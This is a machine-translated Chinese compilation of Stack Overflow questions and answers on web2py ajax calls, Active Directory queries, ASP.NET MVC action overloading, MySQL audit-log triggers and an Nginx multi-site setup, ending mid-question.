如[`ajax()`函数文档](http://web2py.com/books/default/chapter/29/11#The-ajax-function)中所述，函数的第二个参数是输入字段名称的数组，而不是任意值。它读取存储在命名输入字段中的值并通过 POST 请求发送这些值。如果要传递任意值，可以通过将它们附加到查询字符串中的 URL 来实现：

```
var a = 'abc'
ajax('echo?a=' + a, [], 'result'); 
```

在这种情况下， 的值`a`将在`echo()`函数中作为可用`request.vars.a`。

# php - 使用唯一的 Google 的 PageSpeed API 密钥来分析不同网站上的多个页面

> ID：15357478
> 
> 赞同：1
> 
> 时间：2013-03-12T09:27:50.173
> 
> 标签：php, google-app-engine, pagespeed, google-pagespeed

是否可以使用唯一的 PageSpeed API 密钥来分析不同网站上的多个页面？如果没有，是否有任何 api 可以做同样的事情？

# c# - 我可以改善 AD 查询时间吗

> ID：15357480
> 
> 赞同：0
> 
> 时间：2013-03-12T09:27:52.390
> 
> 标签：c#, asp.net, active-directory

根据[此处](http://www.codeproject.com/Articles/90142/Everything-in-Active-Directory-via-C-NET-3-5-Using)找到的代码，我正在查询一个 AD 组以填充关联的下拉列表。下面的代码大约需要 30 秒才能运行，所以想确保我正在使用最好的代码吗？理想情况下，我希望它运行得更快，但感谢大约 1500 人不会花费几秒钟。

```
 // define AD group to use for populating associate list...
        const string groupName = "Group-Name-X";

        // define array objects...
        var userIdLookup = new SortedList();
        var emailLookup = new SortedList();
        var listContents = new SortedList<string, string>();

        // initialise the AD tools class...
        var adm = new ADMethods();

        // get the members of the specified AD group...
        GroupPrincipal group = adm.GetGroup(groupName);

        // iterate over its members
        foreach (Principal p in group.Members)
        {
            // get the data for the user...
            var groupMember = adm.GetUser(p.SamAccountName);

            // if user account found...
            if (groupMember != null)
            {
                // get the user's mail address...
                string mailAddress = groupMember.EmailAddress ?? p.SamAccountName;

                // if domain extension present ...
                if (mailAddress.Contains("@"))
                {
                    // remove it...
                    mailAddress = mailAddress.Split('@')[0].Trim();
                }

                // create a name starting with surname...
                string associateName = string.Format("{0},", groupMember.Surname);

                // append the first name...
                associateName += string.Format(" {0}", groupMember.GivenName);

                // if the middle name is present...
                if (groupMember.MiddleName != string.Empty)
                {
                    // append it to the string...
                    associateName += string.Format(" {0}", groupMember.MiddleName);
                }

                // get the employee ID...
                string associateNumber = p.SamAccountName;

                // if associate already added...
                if (listContents.ContainsKey(associateName))
                {
                    // skip rest of code for this iteration...
                    continue;
                }

                // add to list that will populate dropdown...
                listContents.Add(associateName, mailAddress);

                // add to lookup collection of ccmail to userID
                userIdLookup.Add(mailAddress, associateNumber);

                // add associate name to list...
                emailLookup.Add(associateNumber, mailAddress);
            }
        } 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-21T17:45:14.747

您可以考虑为特定组的成员执行属性范围查询。由于它目前正在实施，因此减速很可能是您必须为每个成员执行新的搜索（您需要使用类似秒表的东西来验证）。使用属性范围查询，您可以一次性加载所有用户，然后对他们进行处理。

我没有尝试过使用 System.DirectoryServices.AccountManagement，但我知道您可以使用 System.DirectoryServices 和 System.DirectoryServices.Protocols 来做到这一点。

[DirectorySearcher 示例](http://msdn.microsoft.com/en-us/library/system.directoryservices.directorysearcher.attributescopequery.aspx)

# asp.net-mvc - MVC 中的重载视图？

> ID：15357482
> 
> 赞同：2
> 
> 时间：2013-03-12T09:27:54.153
> 
> 标签：asp.net-mvc

我想要链接`http://localhost:2409/Account/Confirmation/16`和那个链接 `http://localhost:2409/Account/Confirmation/`（没有参数）。
但是使用这种操作方法，它不起作用。为什么？

```
 public ActionResult Confirmation(int id, string hash)
    {
         Some code..

        return View();
    } 
```

其次，如果参数为空，我只想返回视图。

```
 public ActionResult Confirmation()
    {

        return View();
    } 
```

错误（翻译）：

> 当前对控制器 Confirmation AccountController 的操作请求在以下操作方法之间不明确： System.Web.Mvc.ActionResult Confirmation (Int32, System.String) 类型 TC.Controllers.AccountController System.Web.Mvc.ActionResult Confirmation ( ) 对于类型 TC.Controllers.AccountController

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-03-12T09:40:19.617

您不能使用相同的 HTTP 动词（在您的情况下为 GET）拥有多个具有相同名称的操作。您可以以不同的方式命名您的操作，但这意味着链接会更改，或者您可以使用不同的动词，但这也可能导致像您这样的其他问题不能只在浏览器中输入链接。

您应该做的是将您的选项更改`id`为可选`int?`并将您的两个操作合并为一个：

```
public ActionResult Confirmation(int? id, string hash)
{
    if(id.HasValue)
    {
        //Some code.. using id.Value

        return View();
    }

    //There was no Id given
    return View();
} 
```

您可能还需要在您的路线中允许这`id`是可选的。如果您使用默认路由，这应该是默认设置：

```
routes.MapRoute(
    "Default", // Route name
    "{controller}/{action}/{id}", // URL with parameters
    new { controller = "Home", action = "Index", id = UrlParameter.Optional } 
); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2018-04-04T07:51:19.697

没有必要为它制作 2 种方法。您的 HTTP 请求混淆了`ActionMethod`在这两种情况下都应该调用的内容；

```
http://localhost:2409/Account/Confirmation/16 
http://localhost:2409/Account/Confirmation/ 
```

而不是所有这些，只需创建一个方法。使其参数可选或为参数分配一些默认值。这里有2个例子来理解它。

```
// 1\. Default value to paramter
public ActionResult Confirmation(int id = 0, string hash = null)
{
    //Some code..

    return View();
}  

// 2\. Make id optional
public ActionResult Confirmation(int? id, string hash)
{
    //Some code..

    return View();
} 
```

您可以采用他们的任何一种方法。

# mysql - 如何创建触发器以将更改事件添加到审核日志表中

> ID：15357483
> 
> 赞同：10
> 
> 时间：2013-03-12T09:27:54.900
> 
> 标签：mysql, triggers, audit-logging, audit-trail, change-data-capture

假设我们有`50 tables`一个数据库，我们想要捕获每个表的列中的所有更改（列的先前值和新值）。将有一个审计表，其中包含以下列：

`ID`, `Server_Name`, `User_Name`, `Date_Time`, `Table_Name`, `Column_Name`, `Old_Value`,`New_Value`

将有一个审计表，它将捕获该数据库中所有表的更改。我相信我们可以为该数据库的每个表创建触发器。但是请让我知道如何将所有数据添加到一个审计表中。如果您能给我提供一个非常有用的工作示例。

谢谢和问候， 帕莎

* * *

## 回答 #1

> 赞同：20
> 
> 时间：2013-03-12T10:50:21.133

我可以为你提供一种算法，大部分基础工作已经完成：

这可以是您的审计表，应根据您的要求添加时间戳列作为修改日期或更多信息：

```
CREATE TABLE audit (
     old_data VARCHAR(100),
     new_data VARCHAR(100),
     tbl_name VARCHAR(100)
)
| 
```

这可以用作参考触发器；请注意，每个表都会有一个单独的触发器：

```
CREATE TRIGGER testtrigger BEFORE UPDATE ON <table_name>
  FOR EACH ROW BEGIN
    INSERT INTO audit(old_data, new_data, tbl_name) VALUES (OLD.first_name, NEW.first_name, "testtable");
  END;
| 
```

每列可以有多个插入语句。如果要限制不插入未更改的数据，可以在触发器中进行以下更改：

```
IF(OLD.column_name <> NEW.column_name) THEN
    --Your insert query here
ELSE
    --NOOP
END IF; 
```

如果需要更多信息，请告知。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2019-05-03T17:55:29.660

您可以使用此触发器，但如果它适用于我的每个表，那是最好的，因为您可以控制表结构是否发生变化并且不影响其他表，您可以使用此 repo 的示例： [https：// github.com/areliszxz/mysql_audit](https://github.com/areliszxz/mysql_audit)

```
DELIMITER $$
USE `tudbaauditar`$$
CREATE
TRIGGER `tudbaauditar`.`update`
BEFORE UPDATE ON `tudbaauditar`.`tutablaaauditar` #aqui puedes poner antes o despues del update
FOR EACH ROW
BEGIN
        /*Paso de variables para un mejor control*/
        set @res1 = ''; set @res2 = ''; set @res3 = ''; set @res4 = '';
        /*Sacamos info de la ip donde se ejecuta la accion de UPDATE*/
        select host as IP INTO @ipcl from information_schema.processlist WHERE ID=connection_id();
        #concatenamos los campos de la tabla a auditar y verificamos que no sean null, en caso de que los campos sean null agregamos un espacio
        #las variables (new,old)son de mysql, el valor old es el que ya se tenia en la tabla y el new es el valor que se modifico

        #Valores viejos
        SET @oldq = CONCAT (' id ',ifnull(OLD.id,''),
                                                        ' campo1 ',ifnull(OLD.campo1,''),
                                                        ' campo2 ',ifnull(OLD.campo2,''),
                                                        ' campo3 ',ifnull(OLD.campo3,''));
        #Valores nuevos
        SET @newq = CONCAT (' id ',ifnull(new.id,''),
                                                        ' campo1 ',ifnull(new.campo1,''),
                                                        ' campo2 ',ifnull(new.campo2,''),
                                                        ' campo3 ',ifnull(new.campo3,''));
    #guardamos en una variable los valores que unicamente cambiaron                                                 
    IF OLD.id <> new.id THEN set @res1 = CONCAT ('Cambio id ',ifnull(OLD.id,''), ' a: ',ifnull(new.id,'')); END IF;
    IF OLD.campo1 <> new.campo1 THEN set @res2 = CONCAT ('Cambio campo1 ',ifnull(OLD.campo1,''), ' a: ',ifnull(new.campo1,'')); END IF;
    IF OLD.campo2 <> new.campo2 THEN set @res3 = CONCAT ('Cambio campo2 ',ifnull(OLD.campo2,''), ' a: ',ifnull(new.campo2,'')); END IF;
    IF OLD.campo3 <> new.campo3 THEN set @res4 = CONCAT ('Cambio campo3 ',ifnull(OLD.campo3,''), ' a: ',ifnull(new.campo3,'')); END IF;
    SET @resC=CONCAT(ifnull(@res1,''),'|',ifnull(@res2,''),'|',ifnull(@res3,''),'|',ifnull(@res4,''));

    #insertamos en nuestra tabla de log la informacion
    INSERT INTO basedeauditoria.tablalogs (old,new,usuario,typo,fecha,tabla,valor_alterado,ip)                
    VALUES (@oldq ,@newq,CURRENT_USER,"UPDATE",NOW(),"tutablaaauditar",ifnull(@resC,'No cambio nada'),@ipcl);
END$$

#log de insertados(Nuevos registros)
DELIMITER $$
USE `tudbaauditar`$$
CREATE
TRIGGER `tudbaauditar`.`incert`
BEFORE INSERT ON `tudbaauditar`.`tutablaaauditar`
FOR EACH ROW
BEGIN
    SET @oldq = '';
    SET @newq = CONCAT (' id ',ifnull(new.id,''),
    ' campo1 ',ifnull(new.campo1,''),
    ' campo2 ',ifnull(new.campo2,''),
    ' campo3 ',ifnull(new.campo3,''));
    INSERT INTO sys_logdev.logs (old,new,usuario,typo,fecha,tabla)                
    VALUES (@oldq ,@newq,CURRENT_USER,"INSERT",NOW(),"tutablaaauditar");
END$$

#log de Borrados
DELIMITER $$
USE `tudbaauditar`$$
CREATE
TRIGGER `tudbaauditar`.`delete`
AFTER DELETE ON `tudbaauditar`.`tutablaaauditar`
FOR EACH ROW
BEGIN
    SET @newq = '';
    SET @oldq = CONCAT (' id ',ifnull(new.id,''),
    ' campo1 ',ifnull(new.campo1,''),
    ' campo2 ',ifnull(new.campo2,''),
    ' campo3 ',ifnull(new.campo3,''));
    INSERT INTO sys_logdev.logs (old,new,usuario,typo,fecha,tabla)                
    VALUES (@oldq ,@newq,CURRENT_USER,"DELETE",NOW(),"tutablaaauditar");
END$$ 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2020-11-17T22:08:40.340

这是弗拉德答案的一点改进版本。审核表具有更改“差异”的列。

审核规则：

*   `INSERT`和`DELETE`- 包含所有字段的完整记录存储到审计表
*   `UPDATE`- 仅存储字段的更改

审计表结构。`diff`是存储更改的列。

注意：`privileges`在这种情况下，我们正在审计的表上是 JSON 列。

```
CREATE TABLE roles_audit_log (
    roles_id INT UNSIGNED NOT NULL,
    diff JSON,
    dml_type ENUM('INSERT', 'UPDATE', 'DELETE') NOT NULL,
    dml_timestamp TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP,
    dml_created_by VARCHAR(255) NOT NULL default 'system',
    PRIMARY KEY (roles_id, dml_type, dml_timestamp)
); 
```

触发`UPDATE`语句。将用已更改的字段填充`diff`列。

```
DELIMITER $$

CREATE TRIGGER roles_audit_au AFTER UPDATE ON `roles` FOR EACH ROW
BEGIN
    DECLARE m_change text;
    SET m_change = JSON_OBJECT();

    IF coalesce(NEW.role, '') != coalesce(OLD.role, '') THEN
        SET m_change = JSON_SET(m_change, '$.role', NEW.role);
    END IF;

    IF coalesce(NEW.created_at, '') != coalesce(OLD.created_at, '') THEN
        SET m_change = JSON_SET(m_change, '$.created_at', NEW.created_at);
    END IF;

    IF coalesce(NEW.updated_at, '') != coalesce(OLD.updated_at, '') THEN
        SET m_change = JSON_SET(m_change, '$.updated_at', NEW.updated_at);
    END IF;

    IF coalesce(NEW.privileges, '') != coalesce(OLD.privileges, '') THEN
        SET m_change = JSON_SET(m_change, '$.privileges', NEW.privileges);
    END IF;

    INSERT INTO `roles_audit_log` (
        roles_id,
        diff,
        dml_type,
        dml_created_by
    ) VALUES(
        NEW.id,
        m_change,
        'UPDATE',
        coalesce(@logged_user, 'system')
    );
END;$$
DELIMITER ; 
```

触发`DELETE`语句。将填充`diff`已删除的完整行。

```
DELIMITER $$

CREATE TRIGGER roles_audit_ad AFTER DELETE ON `roles` FOR EACH ROW
BEGIN
    INSERT INTO `roles_audit_log` (
        roles_id,
        diff,
        dml_type,
        dml_created_by
    ) VALUES(
        OLD.id,
        JSON_OBJECT(
            'id', OLD.id,
            'role', OLD.role,
            'privileges', OLD.privileges,
            'created_at', OLD.created_at,
            'updated_at', OLD.updated_at
        ),
        'DELETE',
        coalesce(@logged_user, 'system')
    );
END;$$
DELIMITER ; 
```

触发`INSERT`语句。将填充`diff`已删除的完整行。

```
DELIMITER $$

CREATE TRIGGER roles_audit_ai AFTER INSERT ON `roles` FOR EACH ROW
BEGIN
    INSERT INTO `roles_audit_log` (
        roles_id,
        diff,
        dml_type,
        dml_created_by
    ) VALUES(
        NEW.id,
        JSON_OBJECT(
            'id', NEW.id,
            'role', NEW.role,
            'privileges', NEW.privileges,
            'created_at', NEW.created_at,
            'updated_at', NEW.updated_at
        ),
        'INSERT',
        coalesce(@logged_user, 'system')
    );
END;$$
DELIMITER ; 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2016-05-20T09:17:22.433

我花了几天时间想出了一个存储过程来自动/动态地在 MariaDB（与 v 10.1.9 一起使用）中创建 UPDATE / DELETE 触发器，以审核更新和删除的所有更改。该解决方案使用 INFORMATION_SCHEMA 为您的每个表自动构建审计触发器。在更新时仅审计更改的列，而在删除时，所有历史记录都保留在审计中。

在下面的示例中，我们创建了一个包含两个表的测试数据库，tb_company 和 tb_auditdetail 将保存我们的审计日志。

```
 -- Dynamic Automated Update / Delete Triggers in MariaDB
    -- Leonard Tonna 19/05/2016 - www.ilabmalta.com

    CREATE DATABASE db_ilabmalta_test;

    USE db_ilabmalta_test;

    CREATE TABLE tb_auditDetail(
        audit_pk int(9) NOT NULL PRIMARY KEY AUTO_INCREMENT,
        type varchar(1) NOT NULL,
        tablename varchar(128) NULL,
        pk varchar(128) NULL,
        fieldname varchar(128) NULL,
        oldvalue varchar(1000) NULL,
        newvalue varchar(1000) NULL,
        updatedate datetime NULL,
        username varchar(128) NULL,
        dbusername varchar(128) NULL,
        machinename varchar(128) NULL);

    CREATE TABLE tb_company(
        cmp_pk int(9) NOT NULL PRIMARY KEY AUTO_INCREMENT,
        cmp_name varchar(100) NOT NULL,
        cmp_no varchar(16) NULL,
        cmp_status smallint NOT NULL DEFAULT 1,
        cmp_created datetime NOT NULL DEFAULT CURRENT_TIMESTAMP,
        cmp_createdby varchar(10) NOT NULL,
        cmp_updated datetime NULL,
        cmp_updatedby varchar(10) NULL,
        cmp_record_version int(9) NOT NULL DEFAULT 1 ) ;

    -- We now create sp_maketrigger which is the stored procedure
    -- which will give us our trigger scripts

    DELIMITER $$

    DROP PROCEDURE IF EXISTS sp_maketrigger; 

    CREATE PROCEDURE sp_maketrigger (IN s_tablename CHAR(30), OUT u_trigger_out VARCHAR(65500) CHARACTER SET ascii,OUT d_trigger_out VARCHAR(65500) CHARACTER SET ascii)
    BEGIN
        DECLARE s_fieldname VARCHAR(50);
        DECLARE u_trigger VARCHAR(65500) CHARACTER SET ascii;
        DECLARE d_trigger VARCHAR(65500) CHARACTER SET ascii;
        DECLARE s_key VARCHAR(50);
        DECLARE s_updatedby VARCHAR(50);
        DECLARE s_updated VARCHAR(50);
        DECLARE s_recversion VARCHAR(50);
        DECLARE done INT DEFAULT 0; 
        DECLARE cursor_end CONDITION FOR SQLSTATE '02000'; 
        DECLARE col_cursor CURSOR FOR SELECT COLUMN_NAME FROM test_prepare_vw;
        DECLARE pri_cursor CURSOR FOR SELECT COLUMN_NAME FROM test_prepare_vw2;
        DECLARE upd_cursor CURSOR FOR SELECT COLUMN_NAME FROM test_prepare_vw3;
        DECLARE rec_cursor CURSOR FOR SELECT COLUMN_NAME FROM test_prepare_vw4;
        DECLARE CONTINUE HANDLER FOR cursor_end SET done = 1; 

        DROP VIEW IF EXISTS test_prepare_vw; 
        DROP VIEW IF EXISTS test_prepare_vw2; 
        DROP VIEW IF EXISTS test_prepare_vw3; 
        DROP VIEW IF EXISTS test_prepare_vw4; 

        SET u_trigger = '';
        SET u_trigger = CONCAT('DELIMITER $$ \nDROP TRIGGER IF EXISTS tra_',s_tablename,'_update;\n');
        SET u_trigger = CONCAT(u_trigger,'CREATE TRIGGER tra_',s_tablename,'_update AFTER UPDATE ON ',s_tablename,' FOR EACH ROW \n');
        SET u_trigger = CONCAT(u_trigger,'BEGIN \n');
        SET u_trigger = CONCAT(u_trigger,'DECLARE msg VARCHAR(255); \n');

        SET d_trigger = '';
        SET d_trigger = CONCAT('DELIMITER $$ \nDROP TRIGGER IF EXISTS tra_',s_tablename,'_delete;\n');
        SET d_trigger = CONCAT(d_trigger,'CREATE TRIGGER tra_',s_tablename,'_delete AFTER DELETE ON ',s_tablename,' FOR EACH ROW \n');
        SET d_trigger = CONCAT(d_trigger,'BEGIN \n');

        SET @query = CONCAT('CREATE VIEW test_prepare_vw2 as SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name = \'', s_tablename, '\' AND table_schema = \'db_diers\' AND COLUMN_NAME NOT LIKE \'%updated%\' AND COLUMN_KEY = \'PRI\' ORDER BY ORDINAL_POSITION'); 
        PREPARE stmt from @query; 
        EXECUTE stmt; 
        DEALLOCATE PREPARE stmt; 

        OPEN pri_cursor;
        FETCH pri_cursor INTO s_key; 
        CLOSE pri_cursor; 
        DROP VIEW test_prepare_vw2; 

        SET @query = CONCAT('CREATE VIEW test_prepare_vw3 as SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name = \'', s_tablename, '\' AND table_schema = \'db_diers\' AND COLUMN_NAME LIKE \'%updatedby%\' AND COLUMN_KEY <> \'PRI\' ORDER BY ORDINAL_POSITION'); 
        PREPARE stmt from @query; 
        EXECUTE stmt; 
        DEALLOCATE PREPARE stmt; 

        OPEN upd_cursor;
        FETCH upd_cursor INTO s_updatedby; 
        CLOSE upd_cursor; 
        DROP VIEW test_prepare_vw3; 
        SET s_updated = LEFT(s_updatedby,(LENGTH(RTRIM(s_updatedby)))-2);

        SET @query = CONCAT('CREATE VIEW test_prepare_vw4 as SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name = \'', s_tablename, '\' AND table_schema = \'db_diers\' AND COLUMN_NAME LIKE \'%record_version%\' AND COLUMN_KEY <> \'PRI\' ORDER BY ORDINAL_POSITION'); 
        PREPARE stmt from @query; 
        EXECUTE stmt; 
        DEALLOCATE PREPARE stmt; 

        OPEN rec_cursor;
        FETCH rec_cursor INTO s_recversion; 
        CLOSE rec_cursor; 
        DROP VIEW test_prepare_vw4; 

        SET @query = CONCAT('CREATE VIEW test_prepare_vw as SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name = \'', s_tablename, '\' AND table_schema = \'db_diers\' AND COLUMN_KEY <> \'PRI\' ORDER BY ORDINAL_POSITION'); 
        PREPARE stmt from @query; 
        EXECUTE stmt; 
        DEALLOCATE PREPARE stmt; 

        SET u_trigger = CONCAT(u_trigger,'   IF (ISNULL(NEW.',s_recversion,') OR OLD.',s_recversion,' >= NEW.',s_recversion,' OR ISNULL(NEW.',s_updatedby,') OR NEW.',s_updatedby,' = \'\' OR ISNULL(NEW.',s_updated,') OR NEW.',s_updated,' = OLD.',s_updated,') THEN \n');
        SET u_trigger = CONCAT(u_trigger,'      set msg = \'Cannot update record without specifying updated/updatedby by columns and without incrementing the record version.\'; \n');
        SET u_trigger = CONCAT(u_trigger,'      SIGNAL SQLSTATE \'45000\' SET MESSAGE_TEXT = msg; \n');
        SET u_trigger = CONCAT(u_trigger,'   END IF;     \n');

        OPEN col_cursor;

        FETCH col_cursor INTO s_fieldname; 
        WHILE done = 0 DO 
            SET u_trigger = CONCAT(u_trigger,'   IF (IFNULL(OLD.',s_fieldname,',\'\') <> IFNULL(NEW.',s_fieldname,',\'\') ) THEN\n');
            SET u_trigger = CONCAT(u_trigger,'     INSERT INTO tb_auditdetail (type, tablename, pk, fieldname, oldvalue, newvalue, updatedate, username, dbusername, machinename) \n');
            SET u_trigger = CONCAT(u_trigger,'     VALUES (\'U\', \'',s_tablename,'\', OLD.',s_key,', \'',s_fieldname,'\', OLD.',s_fieldname,', NEW.',s_fieldname,', CURRENT_TIMESTAMP,NEW.',s_updatedby,',CURRENT_USER(),@@hostname);\n');
            SET u_trigger = CONCAT(u_trigger,'   END IF;\n'); 

            SET d_trigger = CONCAT(d_trigger,'     INSERT INTO tb_auditdetail (type, tablename, pk, fieldname, oldvalue, newvalue, updatedate, username, dbusername, machinename) \n');
            SET d_trigger = CONCAT(d_trigger,'     VALUES (\'D\', \'',s_tablename,'\', OLD.',s_key,', \'',s_fieldname,'\', OLD.',s_fieldname,',NULL, CURRENT_TIMESTAMP,NULL,CURRENT_USER(),@@hostname);\n');

            FETCH col_cursor INTO s_fieldname; 
        END WHILE; 
        CLOSE col_cursor; 

        DROP VIEW test_prepare_vw; 

        SET u_trigger = CONCAT(u_trigger,'END;$$ \nDELIMITER ; \n');
        SET d_trigger = CONCAT(d_trigger,'END;$$ \nDELIMITER ; \n');
        SELECT u_trigger INTO u_trigger_out;
        SELECT d_trigger INTO d_trigger_out;

    END; $$

    DELIMITER ;

    -- And finally, to extract the Trigger Scripts

    call sp_maketrigger('tb_company',@s_line1,@d_line1);

    SELECT CONCAT(@s_line1,@d_line1)

    -- You just need to copy, paste and execute the trigger script, and
    -- voila, your audit is in place. 
```

上面的示例理所当然地认为，每个表都有 5 列：created、createdby、updated、updatedby、record_version。

但是，您可以根据需要以不同方式自定义存储过程 sp_maketrigger。sp 也受到增强和改进。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2020-07-31T07:15:48.810

## 数据库表

假设我们有一个包含以下两个表的库应用程序：

[![使用触发器和 JSON 列的 MySQL 审计日志记录](../Images/fe8bc0a9045f776bb93ef876af38dc37.png)](https://i.stack.imgur.com/uE05c.png)

存储新旧行状态的最佳方式是使用 JSON 列。因此，对于您要启用审计日志记录的每个表，您可以创建一个审计日志表，如下所示：

```
CREATE TABLE book_audit_log (
    book_id BIGINT NOT NULL, 
    old_row_data JSON,
    new_row_data JSON,
    dml_type ENUM('INSERT', 'UPDATE', 'DELETE') NOT NULL,
    dml_timestamp TIMESTAMP NOT NULL,
    dml_created_by VARCHAR(255) NOT NULL,
    PRIMARY KEY (book_id, dml_type, dml_timestamp)
) 
```

*   该`book_id`列存储`book`已创建、更新或删除的行的标识符。
*   这是一个 JSON 列，它将在执行 INSERT、UPDATE 或 DELETE 语句之前`old_row_data`捕获记录的状态。`book`
*   这是一个 JSON 列，它将在执行 INSERT、UPDATE 或 DELETE 语句后`new_row_data`捕获记录的状态。`book`
*   这`dml_type`是一个枚举列，用于存储创建、更新或删除给定`book`记录的 DML 语句类型。
*   `dml_timestamp`存储 DML 语句执行时间戳。
*   `dml_created_by`存储发出 INSERT、UPDATE 或 DELETE DML 语句的应用程序用户。

## 使用触发器拦截 INSERT、UPDATE 和 DELETE DML 语句

现在，要提供审计日志表，您需要创建以下 3 个触发器：

```
CREATE TRIGGER book_insert_audit_trigger
AFTER INSERT ON book FOR EACH ROW 
BEGIN
    INSERT INTO book_audit_log (
        book_id,
        old_row_data,
        new_row_data,
        dml_type,
        dml_timestamp,
        dml_created_by
    )
    VALUES(
        NEW.id,
        null,
        JSON_OBJECT(
            "title", NEW.title,
            "author", NEW.author,
            "price_in_cents", NEW.price_in_cents,
            "publisher", NEW.publisher
        ),
        'INSERT',
        CURRENT_TIMESTAMP,
        @logged_user
    );
END

CREATE TRIGGER book_update_audit_trigger
AFTER UPDATE ON book FOR EACH ROW 
BEGIN
    INSERT INTO book_audit_log (
        book_id,
        old_row_data,
        new_row_data,
        dml_type,
        dml_timestamp,
        dml_created_by
    )
    VALUES(
        NEW.id,
        JSON_OBJECT(
            "title", OLD.title,
            "author", OLD.author,
            "price_in_cents", OLD.price_in_cents,
            "publisher", OLD.publisher
        ),
        JSON_OBJECT(
            "title", NEW.title,
            "author", NEW.author,
            "price_in_cents", NEW.price_in_cents,
            "publisher", NEW.publisher
        ),
        'UPDATE',
        CURRENT_TIMESTAMP,
        @logged_user
    );
END

CREATE TRIGGER book_delete_audit_trigger
AFTER DELETE ON book FOR EACH ROW 
BEGIN
    INSERT INTO book_audit_log (
        book_id,
        old_row_data,
        new_row_data,
        dml_type,
        dml_timestamp,
        dml_created_by
    )
    VALUES(
        OLD.id,
        JSON_OBJECT(
            "title", OLD.title,
            "author", OLD.author,
            "price_in_cents", OLD.price_in_cents,
            "publisher", OLD.publisher
        ),
        null,
        'DELETE',
        CURRENT_TIMESTAMP,
        @logged_user
    );
END 
```

> MySQL 函数允许我们创建一个 JSON 对象，该`JSON_OBJECT`对象采用提供的键值对。

列`dml_type`设置为 的值，`INSERT`或者`UPDATE`值设置为。`DELETE``dml_timestamp``CURRENT_TIMESTAMP`

该`dml_created_by`列设置为`@logged_user`MySQL 会话变量的值，该变量先前由应用程序使用当前登录的用户设置：

```
Session session = entityManager.unwrap(Session.class);

Dialect dialect = session.getSessionFactory()
    .unwrap(SessionFactoryImplementor.class)
    .getJdbcServices()
    .getDialect();

session.doWork(connection -> {
    update(
        connection,
        String.format(
            "SET @logged_user = '%s'", 
            ReflectionUtils.invokeMethod(
                dialect,
                "escapeLiteral",
                LoggedUser.get()
            )
        )
    );
}); 
```

## 测试时间

在`book`表上执行 INSERT 语句时：

```
INSERT INTO book (
    id,
    author, 
    price_in_cents, 
    publisher, 
    title
) 
VALUES (
    1,
    'Vlad Mihalcea', 
    3990, 
    'Amazon', 
    'High-Performance Java Persistence 1st edition'
) 
```

我们可以看到插入了一条记录，该记录`book_audit_log`捕获了刚刚在`book`表上执行的 INSERT 语句：

```
| book_id | old_row_data | new_row_data                                                                                                                         | dml_type | dml_timestamp       | dml_created_by |
|---------|--------------|--------------------------------------------------------------------------------------------------------------------------------------|----------|---------------------|----------------|
| 1       |              | {"title": "High-Performance Java Persistence 1st edition", "author": "Vlad Mihalcea", "publisher": "Amazon", "price_in_cents": 3990} | INSERT   | 2020-07-29 13:40:15 | Vlad Mihalcea  | 
```

更新`book`表格行时：

```
UPDATE book 
SET price_in_cents = 4499 
WHERE id = 1 
```

我们可以看到，表`book_audit_log`上的 AFTER UPDATE 触发器将添加一条新记录`book`：

```
| book_id | old_row_data                                                                                                                         | new_row_data                                                                                                                         | dml_type | dml_timestamp       | dml_created_by |
|---------|--------------------------------------------------------------------------------------------------------------------------------------|--------------------------------------------------------------------------------------------------------------------------------------|----------|---------------------|----------------|
| 1       |                                                                                                                                      | {"title": "High-Performance Java Persistence 1st edition", "author": "Vlad Mihalcea", "publisher": "Amazon", "price_in_cents": 3990} | INSERT   | 2020-07-29 13:40:15 | Vlad Mihalcea  |
| 1       | {"title": "High-Performance Java Persistence 1st edition", "author": "Vlad Mihalcea", "publisher": "Amazon", "price_in_cents": 3990} | {"title": "High-Performance Java Persistence 1st edition", "author": "Vlad Mihalcea", "publisher": "Amazon", "price_in_cents": 4499} | UPDATE   | 2020-07-29 13:50:48 | Vlad Mihalcea  | 
```

删除`book`表格行时：

```
DELETE FROM book 
WHERE id = 1 
```

一条新记录被表`book_audit_log`上的 AFTER DELETE 触发器添加到`book`：

```
| book_id | old_row_data                                                                                                                         | new_row_data                                                                                                                         | dml_type | dml_timestamp       | dml_created_by |
|---------|--------------------------------------------------------------------------------------------------------------------------------------|--------------------------------------------------------------------------------------------------------------------------------------|----------|---------------------|----------------|
| 1       |                                                                                                                                      | {"title": "High-Performance Java Persistence 1st edition", "author": "Vlad Mihalcea", "publisher": "Amazon", "price_in_cents": 3990} | INSERT   | 2020-07-29 13:40:15 | Vlad Mihalcea  |
| 1       | {"title": "High-Performance Java Persistence 1st edition", "author": "Vlad Mihalcea", "publisher": "Amazon", "price_in_cents": 3990} | {"title": "High-Performance Java Persistence 1st edition", "author": "Vlad Mihalcea", "publisher": "Amazon", "price_in_cents": 4499} | UPDATE   | 2020-07-29 13:50:48 | Vlad Mihalcea  |
| 1       | {"title": "High-Performance Java Persistence 1st edition", "author": "Vlad Mihalcea", "publisher": "Amazon", "price_in_cents": 4499} |                                                                                                                                      | DELETE   | 2020-07-29 14:05:33 | Vlad Mihalcea  | 
```

就是这样！

# nginx - Nginx + Zend Framework 2 + 从同一个代码库运行多个不同域的网站

> ID：15357484
> 
> 赞同：0
> 
> 时间：2013-03-12T09:27:55.227
> 
> 标签：nginx, centos, zend-framework2

我有一个模块化 Zend Framework 应用程序，我想将其用作具有不同域的多个网站的基础，即：

*   mywebsite.com
*   mydifferentwebsite.com
*   mythirdwebsite.com

我想从同一个代码库和同一个服务器上运行所有这些网站。我想根据主机名更改不同的设置，例如样式或可用页面。

目前这是我获取主机名的方式：

```
$requestSiteUrl = $this->serviceLocator->get('URLRequest')->getServer('HTTP_HOST'); 
```

但是我不确定这有多可靠。有没有更好的方法来找出请求来自哪个网站？

这是我用于服务器上不同网站的 Nginx 配置示例：

```
server {
        listen 80;
        server_name mywebsite.com;

        root /var/www/mywebsite/public;
        index index.php;

        server_tokens off;

